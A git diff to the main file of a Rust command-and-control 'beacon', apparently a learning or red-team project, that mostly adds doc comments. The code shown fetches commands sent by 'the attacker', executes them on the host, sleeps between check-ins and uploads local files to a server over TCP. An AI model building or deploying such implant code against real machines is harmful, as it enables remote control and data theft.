@@ -1,3 +1,6 @@
+//! # Module Main.rs du beacon
+//! Ce module regroupe les fonctions et le point d'entrée main du programme représentant le beacon
+
 use std::process::Command;
 use std::io::BufReader;
 use std::io::BufRead;
@@ -18,7 +21,7 @@ const TIMEOUT:u64=60;
 //use std::os::unix::net::SocketAddr;
 
 
-
+/// Structure contains information of the results command
 struct Resultat{
     status: String,
     stdout: String,
@@ -27,6 +30,9 @@ struct Resultat{
 
 
 
+
+
+/// Create a new Resultat
 fn create_resultat(status: String, stdout: String, stderr: String) -> Resultat{
     Resultat {
         status,
@@ -35,10 +41,13 @@ fn create_resultat(status: String, stdout: String, stderr: String) -> Resultat{
     }
 }
 
+
+/// after X times the beacon will be destroyed by being shutdown
 fn duration_before_shutdown(stream: &mut TcpStream, time:u64) {
     stream.set_read_timeout(Some(Duration::new(TIMEOUT, 0))).expect("set_read_timeout call failed");
 }
-/* execute commands and returns results */
+
+/// execute commands and returns results
 fn execute_commands(command: &str) -> Resultat {
     
     //  runs the program and returns the output
@@ -66,7 +75,7 @@ fn upload_date(stream: &str){
 }
 
 
-/* display the array result */
+/// display the array result 
 fn display_resultat(v: Vec<Resultat>){
     if v.is_empty(){
         println!("Il n'y a pas de resultat ");
@@ -77,23 +86,23 @@ fn display_resultat(v: Vec<Resultat>){
             println!("stderr: {}", i.stderr);
         }
     }
-
 }
 
-
+/// Retrieve the chain command sent by the attacker
 fn get_command(command: &str) -> String{
-    let mut result = command.replace("command  ", "");
-    let result = result.replace(" target", "");
+    let mut result = command.replace("command  ", ""); // remove command from the string
+    let result = result.replace(" target", ""); // remove target from the string
     result
 }
 
-
+/// Sleep the beacon for a specified amount of time
 fn sleep_beacon(milli_second: u64){
     let ten_millis = time::Duration::from_millis(milli_second);
     let now = time::Instant::now();
     thread::sleep(ten_millis);
 }
 
+/// function that uploads a file to the server
 fn upload_file(stream: &mut TcpStream, path: &str) {
     let mut file = File::open(path).unwrap();
     
